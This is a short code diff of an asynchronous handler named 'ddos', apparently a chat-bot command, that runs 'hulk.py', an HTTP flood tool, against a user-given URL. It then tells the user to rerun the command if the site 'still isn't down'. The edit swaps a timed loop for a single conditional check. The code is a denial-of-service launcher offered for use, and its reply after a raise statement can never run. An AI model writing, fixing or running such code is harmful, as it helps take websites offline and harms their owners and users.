@@ -18,8 +18,8 @@ async def ddos(event):
   print("starting attack")
   timeout = 600
   timeout_start = time.time()
-  while time.time() < timeout_start + timeout:
+  if time.time() < timeout_start + timeout:
      subprocess.run(["python", "hulk.py", cmnd, "safe"])
-  if time.time() >= timeout_start + timeout:
+  elif time.time() >= timeout_start + timeout:
      raise KeyboardInterrupt
      await event.reply(f"Attacked has stopped now\nIf {url} still isn't down then run the same command again")
